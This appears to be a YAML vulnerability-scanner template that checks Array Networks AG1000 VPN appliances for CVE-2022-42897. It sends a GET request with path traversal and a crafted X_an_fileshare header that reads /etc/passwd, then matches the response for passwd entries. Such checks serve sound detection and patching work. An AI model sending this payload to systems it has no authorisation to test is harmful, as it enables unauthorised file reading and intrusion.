name: yaml-poc-arraynetworks-ag1000-rce-CVE-2022-42897
binding: a2cdc8fc-8a1c-4a2e-9205-682baef10ed5
detail:
    author: jiapeng.han
    links:
        - http/supportportal.arraynetworks.net/documentation/FieldNotice/Array_Networks_Security_Advisory_Remote_Injection_Vulnerability_in_Array_VPN_Product_ID-11961_%20V2.1.pdf
        - http/supportportal.arraynetworks.net/fieldnotices.html
        - https://cxsecurity.com/cveshow/CVE-2022-42897/
        - https://nvd.nist.gov/vuln/detail/CVE-2022-42897
        - https://support.arraynetworks.net/prx/001/
        - https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/documentation/FieldNotice/Array_Networks_Security_Advisory_Remote_Injection_Vulnerability_in_Array_VPN_Product_ID-11961_%
        - https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/documentation/FieldNotice/Array_Networks_Security_Advisory_Remote_Injection_Vulnerability_in_Array_VPN_Product_ID-11961_%20V2.1.pdf
        - https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/fieldnotices.html
    vulnerability:
        id: 3046ece1-a7e7-467d-8189-f0034ded073b
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /prx/000/http/localhost/client_sec/../addfolder
            headers:
                X_an_fileshare: uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=../../../../../../../../../../etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0()
